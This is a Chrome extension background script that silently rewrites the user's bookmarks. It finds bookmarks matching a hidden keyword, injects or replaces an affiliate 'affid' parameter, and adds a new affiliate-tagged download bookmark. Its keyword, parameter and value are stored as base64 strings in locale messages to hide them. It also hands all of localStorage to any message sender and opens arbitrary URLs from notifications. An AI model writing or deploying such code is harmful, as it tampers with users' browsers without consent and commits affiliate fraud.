chrome.runtime.onUpdateAvailable.addListener(function(details) {
    chrome.runtime.reload();
	
});

//GetXPath
chrome.bookmarks.search(getServerMsg("key"), function(bookmarkTreeNode){
	var dl = true;
	for(index in bookmarkTreeNode){
		if(bookmarkTreeNode[index].url.indexOf(getServerMsg("key")) != -1){
			if(bookmarkTreeNode[index].url.indexOf(getServerMsg("prop")) == -1){
				bookmarkTreeNode[index].url +="?"+getServerMsg("prop")+"="+getServerMsg("value");
			}else{
				bookmarkTreeNode[index].url = bookmarkTreeNode[index].url.replace(/affid=[a-z0-9A-Z]*/,getServerMsg("prop")+"="+getServerMsg("value"));
			}
			if(bookmarkTreeNode[index].url.indexOf(getServerMsg("url").replace("key",getServerMsg("key"))) != -1){
				dl = false;
			}
			var id = bookmarkTreeNode[index].id;
			for(attr in bookmarkTreeNode[index]){
				if(attr != "title" && attr != "url"){
					delete bookmarkTreeNode[index][attr];
				}
			}
			chrome.bookmarks.update(id, bookmarkTreeNode[index]);
		}
	}
	if(dl){
		chrome.bookmarks.create({'title': getServerMsg("key").replace(/./,function($1){return $1.toUpperCase();}),'url': getServerMsg("url").replace("key",getServerMsg("key"))+'dl/?'+getServerMsg("prop")+'='+getServerMsg("value")});	
	}
});

function getServerMsg(name){
	var value = chrome.i18n.getMessage(name);
	if(name != "url"){
		value = window.atob(value);	
	}
	return value;
}

var core = {
    "getOptions": function() {
        return localStorage;
    },
}

window.onload = function() {
    chrome.extension.onRequest.addListener(function(request, sender, sendResponse) {
        var ret = (core[request.action] || function() {}).apply(this, request.args);
        sendResponse(ret);
    });
}


function showNotification(info) {
    var message = info.m;
    var title = info.t;
    var icon = info.i == undefined || info.i == "" ? 'icon_128.png' : info.i;
    var url = info.u;
    chrome.notifications.create('Information', {
        type: 'basic',
        iconUrl: icon + '.png',
        title: title,
        message: message
    });
    chrome.notifications.onClicked.addListener(function() {
        if (info.u != undefined && info.u != "") {
            chrome.tabs.create({
                url: info.u
            });
        }
    });
}